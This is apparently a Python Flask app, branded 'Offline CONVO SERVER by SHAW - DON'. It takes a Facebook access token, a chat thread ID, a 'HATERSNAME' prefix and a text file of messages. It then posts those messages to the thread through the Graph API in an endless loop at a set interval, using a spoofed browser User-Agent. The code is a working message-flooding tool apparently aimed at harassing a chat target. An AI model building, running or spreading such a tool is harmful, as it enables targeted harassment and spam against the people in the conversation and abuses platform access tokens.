from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent by [ SHAW - DON ] {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>𝗢𝗳𝗳𝗹𝗶𝗻𝗲 [ 𝗖𝗢𝗡𝗩𝗢 - 𝗦𝗘𝗥𝗩𝗘𝗥 ] 𝗕𝘆 [ 𝗦𝗛𝗔𝗪 - 𝗗𝗢𝗡 ]  </title>
    </head>
    <body>
        <h1>𝗢𝗳𝗳𝗹𝗶𝗻𝗲 [ 𝗖𝗢𝗡𝗩𝗢 - 𝗦𝗘𝗥𝗩𝗘𝗥 ] 𝗕𝘆 [ 𝗦𝗛𝗔𝗪 - 𝗗𝗢𝗡 ]</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label for="accessToken">ENTER/TOKEN:</label><br>
            <input type="text" name="accessToken" required><br>

            <label for="threadId">CHAT ID/CONVO ID:</label><br>
            <input type="text" name="threadId" required><br>

            <label for="kidx">HATERSNAME:</label><br>
            <input type="text" name="kidx" required><br>

            <label for="txtFile">YOUR/FILE:</label><br>
            <input type="file" name="txtFile" accept=".txt" required><br>

            <label for="time">SECONDS/TIME:</label><br>
            <input type="number" name="time" required><br>

            <button type="submit">Start</button>
        </form>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5005)
